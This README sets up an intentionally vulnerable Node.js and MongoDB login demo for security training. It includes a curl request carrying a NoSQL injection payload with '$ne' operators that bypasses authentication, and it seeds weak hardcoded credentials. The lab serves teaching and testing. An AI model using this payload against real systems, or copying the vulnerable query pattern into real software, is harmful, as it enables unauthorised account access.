

# 🛡️ 1-Login — NoSQL Injection Vulnerability Demo

This project demonstrates a basic login system using MongoDB and Node.js that is intentionally **vulnerable to NoSQL injection**.

Your task as a security tester is to **exploit** the vulnerability and document your findings. This README guides you through setting up, running, and verifying the system so you can get straight to the fun part — hacking it!

---

## 📁 Directory: `nosql-demo/1-login`

### 📦 Prerequisites

Before running the project, make sure the following are installed on your system:

- **Node.js** (v18+ recommended)
- **MongoDB Community Edition** (v6+)
- **MongoDB Shell (`mongosh`)**
- **`curl`** (used to test the endpoints from the command line)

---

## ⚙️ Setup Instructions

### 1. Start MongoDB (with auth enabled)

Open a terminal and run:
```bash
mongod --dbpath /usr/local/var/mongodb --auth
```

Make sure this stays open in a dedicated terminal window. If the directory does not exist, create it with:
```bash
sudo mkdir -p /usr/local/var/mongodb
sudo chown -R $(whoami) /usr/local/var/mongodb
```

---

### 2. Seed the database and create users

In another terminal, open the MongoDB shell:

```bash
mongosh
```

Run the following commands to create the `admin` and `student` users:

```js
use admin
db.createUser({
  user: "admin",
  pwd: "admin123",
  roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
})
db.auth("admin", "admin123")

use nosql-login
db.createUser({
  user: "student",
  pwd: "student123",
  roles: [ { role: "readWrite", db: "nosql-login" } ]
})
```

You can test that the `student` user works:

```bash
mongosh -u student -p student123 --authenticationDatabase nosql-login
```

---

### 3. Install dependencies

⚠️ Note: If you cloned the whole `nosql-demo` project and only see `node_modules` in the root or another folder (e.g., `2-search`), that's fine. Just make sure you run `npm install` **inside** `nosql-demo/1-login/` — this ensures the correct dependencies are locally installed for this service. Do not rely on shared `node_modules` from the root.

From the `nosql-demo/1-login/` directory:

```bash
cd nosql-demo/1-login
npm install
```

---

### 4. Run the vulnerable server

✅ Make sure your MongoDB instance is still running with `--auth` before running this server.

From the same directory:
```bash
node server.js
```

If successful, you’ll see:
```
🚀 Server running at http://localhost:3000
✅ Connected to MongoDB
```

---

### 5. Seed the app data

Use this to add a default admin account:

```bash
curl http://localhost:3000/seed
```

Expected output:
```
Database seeded with admin user.
```

---

## 🧪 Functional Test — Normal Login

Try logging in with correct credentials:
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

Expected output:
```
✅ Login successful!
```

---

## 💉 Vulnerability Test — NoSQL Injection

Try this payload:
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": { "$ne": null }, "password": { "$ne": null }}'
```

Expected output:
```
✅ Login successful!
```

If that works — 🎉 You’ve confirmed NoSQL injection!

---

## ✅ What’s Next?

Now that you have verified the app is running and vulnerable, your job is to:

1. Exploit the NoSQL injection further.
2. Document your exploit code and screenshots.
3. Help implement a mitigation.

Good luck!